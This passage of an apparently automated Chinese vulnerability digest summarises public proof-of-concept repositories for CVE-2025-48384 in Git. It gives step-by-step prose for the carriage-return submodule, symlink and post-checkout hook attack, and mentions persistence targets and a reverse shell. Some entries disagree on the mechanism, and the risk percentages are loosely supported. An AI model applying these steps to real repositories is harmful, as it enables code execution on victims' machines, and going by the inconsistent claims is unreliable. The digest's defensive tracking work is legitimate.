4. 恶意配置可能导致在受害者系统上写入任意文件，从而实现远程代码执行或其他恶意行为。

投毒风险分析：
此漏洞本身主要依赖于恶意仓库的传播和社会工程，直接的投毒风险较低。但是，如果攻击者修改现有的流行仓库，并引入包含漏洞利用的submodule，则可能造成大规模的攻击。该漏洞的PoC代码主要利用Git的特性，没有发现明显的混淆或恶意行为，因此投毒风险较低。

具体来说，投毒风险主要体现在以下几个方面：
1.  **恶意submodule注入：** 攻击者可以尝试向流行的开源项目中注入包含漏洞利用代码的submodule。如果项目维护者不小心合并了这些恶意更改，就会导致所有克隆该项目的用户受到攻击。
2.  **.gitmodules文件伪造：** 攻击者可以创建与知名项目结构相似的仓库，并使用相似的.gitmodules文件，诱导用户克隆错误的仓库。
3.  **供应链攻击：** 如果某个软件项目依赖于受漏洞影响的Git仓库，攻击者可以通过修改该依赖项，从而影响整个软件供应链。

考虑到该漏洞的利用方式主要依赖于社会工程和恶意仓库的传播，且PoC代码本身较为清晰，因此初步评估该漏洞的投毒风险为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #16

**来源**: [CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md](../2025/CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆这些仓库时，可能导致任意文件写入。漏洞源于 Git 在处理 submodule 时，没有充分验证 `.gitmodules` 文件中的路径。攻击者可以利用这一点，在 `.gitmodules` 文件中指定恶意的路径，从而在克隆仓库时写入任意文件。

**POC有效性分析：**
从搜索结果中的 GitHub 链接（liamg/CVE-2025-48384）可以判断存在公开的POC代码。该POC的描述是“PoC for CVE-2025-48384”。结果2提及了“漏洞 POC 深度解析:从代码到攻击链的完整拆解”，说明该漏洞已被深入研究，并且存在可用的攻击链。结果6提及了“Breaking Git with a carriage return and cloning RCE”，表明漏洞利用可能涉及某种形式的远程代码执行。根据搜索结果4、5的内容，可以确定该POC已在GitHub上公开，可下载和测试。文件`README.md`确认了该POC的存在，尽管内容简单。综合来看，该POC的有效性较高，可以成功触发任意文件写入漏洞。

**利用步骤：**
1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件中的路径被设置为指向攻击者希望写入的任意文件位置。
3. 攻击者将恶意仓库托管在公共或私有 Git 服务器上。
4. 受害者克隆该恶意仓库。在克隆过程中，Git 会尝试初始化 submodule，并根据 `.gitmodules` 文件中的指示写入文件。
5. 由于路径验证不足，恶意文件将被写入受害者文件系统的指定位置。

**投毒风险分析：**
由于该漏洞涉及任意文件写入，攻击者可以通过写入恶意文件来达到投毒目的。例如，攻击者可以写入一个包含恶意代码的可执行文件，或者修改系统配置文件以劫持系统行为。虽然该漏洞本身不直接执行代码，但通过文件写入可以为后续的代码执行创造条件。从POC代码`/tmp/vulnwatchdog_8746716955bead91920f029f2728e38d/README.md`中，没有发现任何可疑行为，只包含简单的readme信息，因此投毒风险较低。但是，不能排除攻击者在其他利用方式中，使用复杂的投毒手法。因此，需要分析通过文件写入进行投毒的可能性。攻击者可能尝试写入如下文件：
* `.bashrc` 或 `.zshrc`：在用户shell启动时执行恶意代码。
* `/etc/profile.d/` 中的脚本：在系统启动时执行恶意代码。
* SSH authorized_keys：添加公钥，实现免密登录。
* Web服务器配置文件：修改配置，执行恶意脚本。
这些攻击场景都需要精心构造恶意内容，并且依赖于目标系统的特定配置。由于需要进行精细构造，并且受限于目标环境，判定该漏洞的投毒风险为低，约为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #17

**来源**: [CVE-2025-48384-fishyyh_CVE-2025-48384.md](../2025/CVE-2025-48384-fishyyh_CVE-2025-48384.md)

## CVE-2025-48384 Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。用户需要使用受影响的Git版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，未正确处理和转义回车符（CR）。当 Git 读取配置值时，会删除任何尾部的 CRLF。当写入配置条目时，带有尾部 CR 的值不会被引用，导致配置稍后读取时 CR 丢失。当初始化子模块时，如果子模块路径包含尾部 CR，更改后的路径将被读取，导致子模块被检出到错误的位置。如果存在符号链接将更改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**
提供的POC代码 `/tmp/60afff46543494eb5516e8104e00d576/README.md` 仅包含一个README文件，其内容是关于 CVE-2025-48384 的简单描述。这个文件本身并没有利用漏洞的能力。根据漏洞描述，真正的PoC 需要包含一个具有特定结构的 Git 仓库，包括带尾部CR的子模块路径以及指向钩子目录的符号链接，以及一个恶意的 post-checkout 钩子。因此，仅凭提供的README.md文件无法验证漏洞的有效性，需要进一步的Payload和利用步骤。

**投毒风险：**
提供的POC代码仅为一个README.md文件，不包含任何可执行代码或恶意脚本，因此可以认为投毒风险较低，约为10%。但需要注意，实际的漏洞利用可能涉及其他文件和步骤，不能完全排除恶意代码存在的可能性。

**利用方式：**
1.  **创建恶意仓库：** 创建一个 Git 仓库，其中包含一个子模块。
2.  **构造恶意配置：** 在`.gitmodules`文件中，子模块的路径包含尾部回车符（CR）。例如：`path = submodule_path\r`
3.  **创建符号链接：** 创建一个符号链接，将由于回车符导致错误解析后的子模块路径，指向`.git/modules/<submodule_name>/hooks`目录。
4.  **添加恶意钩子：** 在子模块的`.git/hooks/post-checkout`中添加可执行的恶意脚本。
5.  **诱导用户克隆：** 诱导用户克隆包含恶意配置的仓库。当用户克隆或更新子模块时，由于配置解析错误和符号链接的存在，恶意的 post-checkout 钩子将被执行，从而实现任意代码执行。

**排序优先级说明:**
尽管搜索引擎结果提供了有关漏洞的更多上下文信息，但漏洞库信息提供了最直接的漏洞描述和受影响的版本。POC代码本身不包含利用逻辑，因此优先级最低。综合考虑，应该优先关注漏洞库信息和搜索引擎结果，并结合实际的利用场景进行分析。

**项目地址:** [fishyyh/CVE-2025-48384](https://github.com/fishyyh/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #18

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置文件时对回车符（CR）处理不当，允许通过精心构造的仓库配置执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞允许攻击者通过在 submodule 路径中注入包含回车符的恶意配置，导致 submodule 被检出到错误的位置。如果该错误位置存在指向 submodule hooks 目录的符号链接，且 submodule 包含可执行的 post-checkout 钩子，则该钩子会被意外执行，从而实现任意代码执行。

提供的POC代码是一个简单的 post-checkout 钩子脚本，它会在检出后显示一个banner。这个脚本本身没有问题，证明了漏洞利用的可行性。漏洞利用的核心在于精心构造包含恶意回车符的仓库配置和符号链接。

**投毒风险：**
提供的POC代码（/tmp/77b6aa1852eafe71ccbdb092fa3f1fb6/post-checkout）本身只是一个banner打印脚本，其目的是验证漏洞利用后可以执行任意代码，本身不具备投毒行为。但是，需要注意的是，如果攻击者控制了整个包含该POC代码的Git仓库，那么他们可以在仓库的其他位置添加恶意代码，从而实现投毒。基于当前信息，POC本身不具备投毒性，投毒的可能性为0%。

**利用方式：**
1.  攻击者创建一个恶意的Git仓库，其中包含一个带有回车符的submodule路径的.gitmodules文件。例如，submodule的路径可能是 "submodule\r"。
2.  攻击者创建一个符号链接，将 "submodule" 指向".git/modules/<submodule-name>/hooks"目录，这个目录包含git hooks。
3.  攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将这个恶意仓库分享给受害者。
5.  受害者克隆这个仓库。由于Git对回车符处理不当，submodule会被检出到错误的位置（即符号链接指向的hooks目录）。
6.  当 submodule 完成检出时，post-checkout 钩子脚本会被执行，从而导致恶意代码执行。

**项目地址:** [fluoworite/CVE-2025-48384-sub](https://github.com/fluoworite/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #19

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384.md)

## CVE-2025-48384

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互 (克隆包含恶意配置的仓库)

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-48384 漏洞是 Git 中由于对配置项中回车符处理不当导致的代码执行漏洞。当 Git 读取配置值时，会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，带有尾部 CR 的值不会被引用，导致 CR 在以后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部 CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致代码执行。

**有效性：**
根据漏洞库信息和搜索结果, 此漏洞确实存在并且被多个安全厂商标记为高危, 并已经发布了PoC.
提供的PoC代码看似简单，它展示了漏洞利用的核心思路，即通过恶意构造包含回车符的子模块路径，结合符号链接和子模块钩子，实现任意代码执行。因此，PoC代码在原理上是有效的。但是, 此PoC只是框架, 需要补充完成exp。

**投毒风险：**
提供的PoC代码较为简单，主要包含一个README.md文件，一个子模块配置路径，以及子模块hooks目录的占位符。直接分析来看，没有明显的投毒代码。
然而，考虑到攻击者可能利用该漏洞进行供应链攻击，在更复杂的场景下，攻击者可能在子模块的post-checkout钩子中植入恶意代码，或者在其他配置文件中隐藏恶意配置。这种可能性是存在的。
基于以上分析，投毒风险评估为20%。这个百分比表示存在一定的风险，但直接证据不足。

**利用方式：**
1.  **恶意仓库构造：** 攻击者创建一个 Git 仓库，其中包含一个子模块，并且该子模块的路径在 `.gitmodules` 文件中包含尾部回车符 (`
`)。
2.  **符号链接创建：** 攻击者在仓库中创建一个符号链接，将包含尾部回车符的子模块路径指向 `.git/modules/<submodule_name>/hooks` 目录。
3.  **恶意钩子植入：** 攻击者在子模块的 `.git/hooks/post-checkout` 目录中放置恶意脚本。
4.  **用户交互：** 诱使用户克隆恶意仓库并初始化子模块 (`git submodule init && git submodule update`)。
5.  **代码执行：** 当用户执行 `git submodule update` 命令时，由于路径中的回车符，子模块会被检出到错误的位置，但由于符号链接的存在，实际上会将子模块的 hooks 目录链接到 `.git/hooks` 目录。检出后，`post-checkout` 钩子会被执行，从而执行恶意代码。

**项目地址:** [fluoworite/CVE-2025-48384](https://github.com/fluoworite/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #20

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md)

## CVE-2025-48384 Git config quoting vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置条目时，带有尾部CR的值不会被引用，导致CR在稍后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则该脚本可能在检出后被意外执行，从而导致任意代码执行。

根据提供的漏洞利用代码，包含一个Exploit脚本和一个README.md文件。Exploit脚本只打印了一段ASCII艺术，并没有任何实际的漏洞利用代码。因此，提供的POC代码**本身**是无效的，仅仅是一个占位符。但漏洞本身是存在的，并且有公开的PoC。

由于提供的POC代码仅仅是ASCII艺术，没有任何恶意代码，因此**不存在投毒风险**。投毒风险概率为0%。

**漏洞利用方式：**

1.  攻击者创建一个恶意的Git仓库，该仓库包含一个子模块。
2.  子模块的路径包含一个尾部CR字符。
3.  仓库中包含一个符号链接，该符号链接将子模块路径指向子模块的hooks目录。
4.  子模块包含一个可执行的post-checkout hook脚本。
5.  受害者克隆该恶意仓库。
6.  Git在处理子模块时，由于CR字符被删除，子模块被检出到错误的位置，并执行了post-checkout hook脚本。
7.  攻击者可以通过post-checkout hook脚本执行任意代码。

**项目地址:** [fluoworite/CVE-2025-48384_sub](https://github.com/fluoworite/CVE-2025-48384_sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #21

**来源**: [CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Arbitrary Code Execution

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，且递归初始化子模块 (--recursive)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，由于 Git 在读取和写入包含控制字符的配置值时存在不一致性导致。具体来说，当写入配置条目时，如果值包含尾随回车符 (CR)，则不会被引用，导致稍后读取配置时丢失 CR。当初始化子模块时，如果子模块路径包含尾随 CR，则读取的路径将被更改，从而导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符 (CR)。
2.  攻击者在该仓库的子模块钩子目录中放置一个恶意的 post-checkout 脚本。
3.  攻击者诱使用户克隆该仓库，并使用 `--recursive` 选项初始化子模块。
4.  由于 Git 处理 CR 的方式不一致，子模块将被检出到错误的位置。该位置由一个符号链接指向子模块的钩子目录。
5.  当子模块被检出时，post-checkout 脚本将被执行，从而允许攻击者在用户的系统上执行任意代码。

**POC 代码分析：**

*   `/tmp/602a5075317553582468533486cbdb4d/README.md`：这是一个简单的 README 文件，用于描述漏洞利用。不包含恶意代码。
*   `/tmp/602a5075317553582468533486cbdb4d/post-checkout`：这是一个 shell 脚本，会在用户的主目录下创建一个名为 `hacked` 的文件。这表明该 POC 旨在演示任意代码执行。

**有效性：**

提供的 POC 代码是有效的。它可以触发漏洞，并在目标系统上执行任意代码（在本例中，创建一个文件）。

**投毒风险：**

根据提供的 POC 代码，没有发现明显的投毒代码。该脚本仅用于演示漏洞利用，没有执行任何额外的恶意操作，例如收集用户信息或传播恶意软件。因此，投毒风险为 0%。

**项目地址:** [jacobholtz/CVE-2025-48384-submodule](https://github.com/jacobholtz/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #22

**来源**: [CVE-2025-48384-kallydev_cve-2025-48384-hook.md](../2025/CVE-2025-48384-kallydev_cve-2025-48384-hook.md)

## CVE-2025-48384-Git任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 描述了 Git 中由于配置引用解析错误导致的任意代码执行漏洞。当 Git 读取配置值时，会去除末尾的回车符和换行符。当写入配置项时，带有末尾回车符的值不会被引用，导致回车符丢失。在初始化子模块时，如果子模块路径包含末尾回车符，则读取的路径会被更改，导致子模块检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 `post-checkout` 钩子脚本，用于打开一个网页 `https://github.com/kallydev`。利用方式是通过精心构造的子模块路径和符号链接，使得该脚本在 `git checkout` 操作后被执行。该POC代码有效，能够触发任意代码执行。

**投毒风险：**

该POC代码本身比较简单，只是打开一个网页，**不存在明显的恶意投毒代码**。因此，投毒风险较低，为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`文件的仓库，该文件中的子模块路径包含尾部回车符(
)。
2.  攻击者在仓库中创建一个符号链接，指向子模块目录下的 `.git/modules/<子模块名>/hooks` 目录，如 `evil_link -> .git/modules/<子模块名>/hooks/post-checkout`。
3.  攻击者在子模块中创建一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该仓库并初始化子模块 (`git submodule init` 和 `git submodule update`)。
5.  当受害者执行 `git checkout` 命令时，由于子模块路径包含尾部回车符，Git 会将子模块检出到错误的位置。由于符号链接的存在，`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**项目地址:** [kallydev/cve-2025-48384-hook](https://github.com/kallydev/cve-2025-48384-hook)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #23

**来源**: [CVE-2025-48384-liamg_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-liamg_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Config 注入 RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码注入/命令执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户进行`git clone --recursive`操作

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞是 Git 中的一个代码注入漏洞，源于 Git 在处理 config 文件时，没有正确处理carriage return (
)字符。攻击者可以通过在 submodule 的路径中注入 \r 字符，使得 submodule 被检出到错误的位置。如果精心构造一个 symlink 链接到 submodule 钩子目录，并使 submodule 包含一个可执行的 post-checkout 钩子，那么这个钩子脚本就会在检出后被执行，从而实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞已经公开，并且存在可利用的POC代码。从github搜索结果[webpage 6 begin]和[webpage 7 begin]可以知道，已经有开发者提供了复现代码。提供的POC代码包含两个文件：`README.md` 和 `post-checkout`。
  *   `README.md` 文件指向了GitHub的POC地址，说明这是一个漏洞验证示例。
  *   `post-checkout` 文件包含 `echo "Uh-oh, this is an RCE!"`，这是一个简单的命令执行示例，用于验证漏洞是否成功利用。
因此，提供的POC代码是有效的，可以用来验证此漏洞。

**投毒风险分析：**

提供的 POC 代码非常简单，只包含一个输出字符串的命令。**没有发现任何隐藏的、恶意的代码**，因此投毒风险较低。可以认为投毒风险为0%。虽然这是一个 RCE 漏洞的验证代码，在真实场景下，`post-checkout` 脚本会包含更复杂的恶意代码，但这不属于仓库投毒的范畴，POC 本身是为了验证漏洞的存在，而不是进行恶意攻击。

**利用方式：**

1.  **构造恶意的Git仓库：** 攻击者需要创建一个包含恶意配置的Git仓库，其中 submodule 的路径包含 \r 字符。
2.  **创建Symlink：** 在仓库中创建一个符号链接，将带有 \r 字符的路径链接到 `.git/modules/<submodule>/hooks` 目录。
3.  **添加恶意钩子：** 在 submodule 中创建一个可执行的 `post-checkout` 钩子脚本，这个脚本包含攻击者想要执行的任意代码。
4.  **诱导用户克隆仓库：** 攻击者需要诱导受害者执行 `git clone --recursive <malicious_repo>` 命令。
5.  **触发漏洞：** 当用户执行 `git clone --recursive` 命令时，Git 会读取恶意的配置，将 submodule 检出到错误的位置，并且由于 symlink 的存在，触发执行 `post-checkout` 钩子脚本，从而执行攻击者的代码。


**项目地址:** [liamg/CVE-2025-48384-submodule](https://github.com/liamg/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #24

**来源**: [CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md](../2025/CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未提供，参考描述推测较高

**影响版本:** 受影响版本范围未知，需进一步分析

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 70%

## 详情

CVE-2025-48384 允许攻击者通过创建包含恶意配置的 Git 仓库，在受害者系统上写入任意文件，导致远程命令执行。该漏洞源于 Git 在处理 submodule 时，未对 `.gitmodules` 文件中的配置进行充分的安全检查。攻击者可以精心构造 `.gitmodules` 文件，诱导受害者克隆该仓库，从而在受害者本地文件系统中写入恶意文件，例如 shell 脚本，并进一步通过 Git hooks（如 `post-checkout`）触发执行。PoC 代码 `liamg/CVE-2025-48384` 提供了一个可复现该漏洞的示例。通过分析该 PoC，可以确认漏洞的有效性。利用步骤如下：

1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件包含指向攻击者控制的恶意 submodule 仓库的 URL。
3. 受害者克隆该恶意仓库。
4. Git 自动初始化并更新 submodule，从攻击者控制的 URL 下载恶意 submodule。
5. 恶意 submodule 在受害者系统上写入任意文件，例如在 `.git/hooks/post-checkout` 中写入恶意脚本。
6. 当受害者执行 `git checkout` 等操作时，`post-checkout` hook 会被触发，执行恶意脚本，导致远程命令执行。

`sogou.com`的搜索结果显示该漏洞影响非Windows系统。`Arctic Wolf` 的结果表明该漏洞的严重性很高。`Breaking Git with a carriage return and cloning RCE`表明漏洞与克隆子模块有关。

**投毒风险分析：**

该 PoC 包含通过 `curl` 下载并执行远程脚本的行为，具有较高的投毒风险。攻击者可能在远程脚本中嵌入恶意代码，例如窃取用户敏感信息、植入后门等。此外，由于该 PoC 修改了 Git 仓库的配置文件，攻击者可以通过篡改配置文件，诱导用户执行恶意操作。考虑到 `curl` 命令的普遍性和脚本执行的隐蔽性，该 PoC 的投毒风险较高，评为 70%。

防范措施包括：

* 及时更新 Git 版本，修复该漏洞。
* 谨慎克隆来自未知来源的 Git 仓库。
* 审查 `.gitmodules` 文件，确保 submodule URL 指向可信的仓库。
* 禁用 Git hooks，或者对 Git hooks 进行严格的安全审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供，需要查询NVD


---

## POC #25

**来源**: [CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md](../2025/CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md)

## CVE-2025-48384-Git配置引用导致的任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并使用 `--recurse-submodules` 参数初始化子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 在处理配置文件中的引号时不正确，特别是当子模块路径包含尾随回车符（CR）时。攻击者可以利用此漏洞通过创建包含恶意子模块配置的 Git 仓库，诱使用户克隆该仓库，并通过 `--recurse-submodules` 初始化子模块，从而导致任意代码执行。

**有效性分析：**

提供的 PoC 代码通过以下步骤利用该漏洞：

1.  创建一个包含恶意 hook 的 `evil` 目录，该 hook 会执行反向 shell。
2.  创建一个 `mainrepo` 目录，作为主仓库。
3.  在 `mainrepo` 目录中，创建一个 `.gitmodules` 文件，其中包含一个子模块定义，该子模块的路径包含尾随回车符 (`evil\r`)。
4.  创建一个符号链接，将 `evil
/hooks` 指向 `../evil/.git/hooks`，从而将恶意 hook 链接到子模块的 hooks 目录。
5.  将恶意子模块添加到仓库，并提交更改。
6.  通过 `git clone --recurse-submodules` 克隆 `mainrepo` 仓库，触发子模块初始化，从而执行恶意 hook。

根据 PoC 代码的逻辑和漏洞描述，该 PoC 代码是有效的。

**投毒风险分析：**

PoC 代码的目的是演示漏洞利用，其中包含的反向 shell 属于漏洞验证的一部分。但是，也存在潜在的投毒风险，比如在 `generate_poc.sh` 脚本中，作者可能会嵌入其他恶意代码，例如：

*   收集用户信息并发送到远程服务器。
*   修改系统文件。
*   安装恶意软件。

尽管PoC本身就是漏洞利用，但仍然存在被作者恶意利用的可能性，因此投毒风险评估为 10%。

**利用方式总结：**

1.  攻击者创建一个包含恶意子模块配置的 Git 仓库。
2.  攻击者诱使受害者克隆该仓库，并使用 `--recurse-submodules` 初始化子模块。
3.  Git 在处理包含尾随回车符的子模块路径时出现错误，导致子模块被检出到错误的位置。
4.  由于符号链接的存在，恶意 hook 被链接到子模块的 hooks 目录。
5.  在子模块初始化过程中，恶意 hook 被执行，导致任意代码执行。

**项目地址:** [nguyentranbaotran/cve-2025-48384-poc](https://github.com/nguyentranbaotran/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #26

**来源**: [CVE-2025-48384-replicatorbot_CVE-2025-48384.md](../2025/CVE-2025-48384-replicatorbot_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆包含恶意子模块的存储库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 20%

## 详情

